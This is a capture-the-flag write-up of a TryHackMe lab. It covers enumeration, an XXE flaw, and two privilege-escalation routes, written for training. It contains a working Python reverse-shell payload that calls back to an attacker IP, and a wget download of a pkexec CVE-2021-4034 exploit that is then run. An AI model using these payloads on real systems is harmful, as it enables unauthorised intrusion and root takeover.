## battery
https://tryhackme.com/room/battery

## Enum
```
nmap -Pn -sC -sV 10.10.125.152 -vv

Scanning ip.thm (10.10.125.152) [1000 ports]
Discovered open port 80/tcp on 10.10.125.152
Discovered open port 22/tcp on 10.10.125.152

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 14:6b:67:4c:1e:89:eb:cd:47:a2:40:6f:5f:5c:8c:c2 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAPe2PVDHBBlUCEtHNVxjToY/muZpZ4hrISDM7fuGOkh/Lp9gAwpEh24Y/u197WBDTihDJsDZJqrJEJSWbpiZgReyh1LtJTt3ag8GrUUDJCNx6lLUIWR5iukdpF7A2EvV4gFn7PqbmJmeeQRtB+vZJSp6VcjEG0wYOcRw2Z6N6ho3AAAAFQCg45+RiUGvOP0QLD6PPtrMfuzdQQAAAIEAxCPXZB4BiX72mJkKcVJPkqBkL3t+KkkbDCtICWi3d88rOqPAD3yRTKEsASHqSYfs6PrKBd50tVYgeL+ss9bP8liojOI7nP0WQzY2Zz+lfPa+d0uzGPcUk0Wg3EyLLrZXipUg0zhPjcXtxW9+/H1YlnIFoz8i/WWJCVaUTIR3JOoAAACBAMJ7OenvwoThUw9ynqpSoTPKYzYlM6OozdgU9d7R4XXgFXXLXrlL0Fb+w7TT4PwCQO1xJcWp5xJHi9QmXnkTvi386RQJRJyI9l5kM3E2TRWCpMMQVHya5L6PfWKf08RYGp0r3QkQKsG1WlvMxzLCRsnaVBqCLasgcabxY7w6e2EM
|   2048 66:42:f7:91:e4:7b:c6:7e:47:17:c6:27:a7:bc:6e:73 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkDLTds2sLmn9AZ0KAl70Fu5gfx5T6MDJehrsCzWR3nIVczHLHFVP+jXDzCcB075jjXbb+6IYFOdJiqgnv6SFxk85kttdvGs/dnmJ9/btJMgqJI0agbWvMYlXrOSN26Db3ziUGrddEjTT74Z1kokg8d7uzutsfZjxxCn0q75NDfDpNNMLlstOEfMX/HtOUaLQ47IeuSpaQoUkNkHF2SGoTTpbC+avzcCNHRIZEwQ6HdA3vz1OY6TnpAk8Gu6st9XoDGblGt7xv1vyt0qUdIYaKib8ZJQyj1vb+SJx6dCljix4yDX+hbtyKn08/tRfNeRhVSIIymOTxSGzBru2mUiO5
|   256 a8:6a:92:ca:12:af:85:42:e4:9c:2b:0e:b5:fb:a8:8b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCYHRWUDqeSQgon8sLFyvLMQygCx01yXZR6kxiT/DnZU+3x6QmTUir0HaiwM/n3aAV7eGigds0GPBEVpmnw6iu4=
|   256 62:e4:a3:f6:c6:19:ad:30:0a:30:a1:eb:4a:d3:12:d3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILW7vyhbG1WLLhSEDM0dPxFisUrf7jXiYWNSTqw6Exri
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
```

```
nmap -Pn 10.10.125.152 --open --min-rate 1000 -p-

Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```
ffuf -u http://ip.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt                            

.htpasswd               [Status: 403, Size: 282, Words: 21, Lines: 11, Duration: 3104ms]
.hta                    [Status: 403, Size: 277, Words: 21, Lines: 11, Duration: 4104ms]
.htaccess               [Status: 403, Size: 282, Words: 21, Lines: 11, Duration: 6083ms]
admin.php               [Status: 200, Size: 663, Words: 45, Lines: 26, Duration: 418ms]
index.html              [Status: 200, Size: 406, Words: 138, Lines: 25, Duration: 409ms]
report                  [Status: 200, Size: 16912, Words: 69, Lines: 21, Duration: 402ms]
scripts                 [Status: 301, Size: 301, Words: 20, Lines: 10, Duration: 402ms]
server-status           [Status: 403, Size: 286, Words: 21, Lines: 11, Duration: 394ms]
:: Progress: [4713/4713] :: Job [1/1] :: 96 req/sec :: Duration: [0:00:52] :: Errors: 0 ::
```

```
wget http://ip.thm/report
Saving to: ‘report’

file report
report: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=44ffe4e81d688f7b7fe59bdf74b03f828a4ef3fe, for GNU/Linux 3.2.0, not stripped

chmod +x report
```

```
./report

Welcome To ABC DEF Bank Managemet System!

UserName : admin

Password : admin
Wrong username or password
```

```
strings report

/lib64/ld-linux-x86-64.so.2
__isoc99_scanf
puts
printf
system
__cxa_finalize
strcmp
u/UH
[]A\A]A^A_
admin@bank.a
Password Updated Successfully!
Sorry you can't update the password
Welcome Guest
===================Available Options==============
1. Check users
2. Add user
3. Delete user
4. change password
5. Exit
clear
===============List of active users================
support@bank.a
contact@bank.a
cyber@bank.a
admins@bank.a
sam@bank.a
admin0@bank.a
super_user@bank.a
control_admin@bank.a
it_admin@bank.a
Welcome To ABC DEF Bank Managemet System!
UserName :
Password :
guest
Your Choice :
email :
not available for guest account
Wrong option
Wrong username or password
;*3$"
GCC: (Debian 9.3.0-15) 9.3.0
```
🏴 I got some admin account?

![image](https://user-images.githubusercontent.com/6504854/188196979-0f93f957-695c-480d-a47d-3e98cd04e6b6.png)

🏴 So secure bank, uhh! Let's find to the way to login as admin.

![image](https://user-images.githubusercontent.com/6504854/188197510-31c961df-af97-4ac7-b55b-f6acd5dd2d76.png)

![image](https://user-images.githubusercontent.com/6504854/188197709-17d3f9a3-ef07-4f88-a622-329e68a30785.png)

![image](https://user-images.githubusercontent.com/6504854/188197825-d87602fc-41bd-4989-94ed-25cc53fc44cc.png)

![image](https://user-images.githubusercontent.com/6504854/188198893-92d844d3-b93a-4508-a597-d4e4972774b1.png)

![image](https://user-images.githubusercontent.com/6504854/188199013-ddeb1d68-621b-4935-9087-a43a9bbec7fe.png)

![image](https://user-images.githubusercontent.com/6504854/188199455-5de19e38-79d5-41b6-864d-dde007d495ff.png)

🏴 I could regist user and login but couldn't use form.php. Cheking of source, forms.php may accept xml post request???

![image](https://user-images.githubusercontent.com/6504854/188202834-b0537e55-ae02-4aa1-862e-6c1c0b256205.png)

![image](https://user-images.githubusercontent.com/6504854/188202927-2f5842d8-91d6-48db-b21d-4634e371787f.png)

![image](https://user-images.githubusercontent.com/6504854/188203104-8e8416f3-1f61-4376-8e1b-4769cbf95d69.png)

![image](https://user-images.githubusercontent.com/6504854/188203264-33fdfab9-4461-4bea-9c6a-6adb1981270a.png)

![image](https://user-images.githubusercontent.com/6504854/188204067-60ae6483-0d0e-4a7b-9a31-c5dd2109e97c.png)

![image](https://user-images.githubusercontent.com/6504854/188205897-3647a229-eb78-490e-af24-3517d0c222d4.png)

🏴 Bypassing and logined as admin, forms.php has XXE vul so I could see code of php files.

```
'echo 'PCFET0NUWVBFIGh0bWw+CjxodG1s......==' | base64 -d
```

![image](https://user-images.githubusercontent.com/6504854/188206021-a68befb1-3e5f-4a67-9ef4-33401ed065b1.png)

🏴 Hardcoding of credential 😋

## Flag
### Root Path 1
```
ssh cyber@ip.thm

cyber@ubuntu:~$ ls
flag1.txt  run.py
cyber@ubuntu:~$ cat flag1.txt
THM{6******************************}

Sorry I am not good in designing ascii art :(

cyber@ubuntu:~$ sudo -l
Matching Defaults entries for cyber on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cyber may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/python3 /home/cyber/run.py
cyber@ubuntu:~$ sudo /usr/bin/python3 /home/cyber/run.py
Hey Cyber I have tested all the main components of our web server but something unusal happened from my end!

cyber@ubuntu:~$ mv run.py run.py.bk
cyber@ubuntu:~$ vi run.py
```

```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
import pty
pty.spawn("/bin/bash")
```

```
cyber@ubuntu:~$ sudo /usr/bin/python3 /home/cyber/run.py
```
![image](https://user-images.githubusercontent.com/6504854/188209658-04fc02f5-4b5f-48a0-a0c9-57b6e7ae402c.png)

### Root Path 2 

```
cyber@ubuntu:/home$ ls -la /usr/bin/pkexec
-rwsr-xr-x 1 root root 23304 Feb 12  2014 /usr/bin/pkexec

cyber@ubuntu:~$ wget http://10.10.10.10/1.tar
Saving to: ‘1.tar’

cyber@ubuntu:~$ tar -xvf 1.tar
./cve-2021-4034

cyber@ubuntu:~$ ./cve-2021-4034
# cat /root/root.txt
████████████████████████████████████
██                                ██
██  ████  ████  ████  ████  ████  ████
██  ████  ████  ████  ████  ████  ████
██  ████  ████  ████  ████  ████  ████
██  ████  ████  ████  ████  ████  ████
██  ████  ████  ████  ████  ████  ████
██                                ██
████████████████████████████████████


                                                battery designed by cyberbot :)
                                                Please give your reviews on catch_me75@protonmail.com or discord cyberbot#1859

THM{d**********************}

# cat /home/yash/flag2.txt
THM{2**********************}

Sorry no ASCII art again :(
```

I'm happy to make someone's inspirations. Happy hacking 😋

Sorry for my poor explain :(

